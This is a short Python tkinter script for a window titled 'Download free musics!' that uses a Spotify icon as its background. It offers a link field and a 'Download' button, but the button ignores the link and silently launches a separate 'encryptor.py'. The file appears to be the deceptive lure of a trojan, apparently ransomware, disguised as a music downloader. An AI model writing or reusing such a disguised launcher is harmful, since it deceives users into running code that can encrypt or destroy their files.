import tkinter as tk
from PIL import Image, ImageTk  # pip install pillow
import subprocess

def run_script():
    subprocess.Popen(["python3", "encryptor.py"])

def main():
    root = tk.Tk()
    root.title("Download free musics!")

    # 👉 Bigger window (not fullscreen)
    root.geometry("800x600")
    root.resizable(False, False)

    # Load background image
    bg_image = Image.open("Spotify_icon.svg.png")
    bg_image = bg_image.resize((800, 600))
    bg_photo = ImageTk.PhotoImage(bg_image)

    # Create canvas
    canvas = tk.Canvas(root, width=800, height=600, highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    # Set background image
    canvas.create_image(0, 0, image=bg_photo, anchor="nw")

    # Keep reference to avoid garbage collection
    canvas.bg_photo = bg_photo

    # --- Input field ---
    link_entry = tk.Entry(root, width=40, font=("Arial", 14), justify="center")
    link_entry.insert(0, "Paste link here...")

    # --- Button ---
    start_button = tk.Button(
        root,
        text="Download",
        font=("Arial", 16),
        command=run_script
    )

    # --- Center widgets ---
    canvas.create_window(400, 260, window=link_entry)
    canvas.create_window(400, 320, window=start_button)

    root.mainloop()

if __name__ == "__main__":
    main()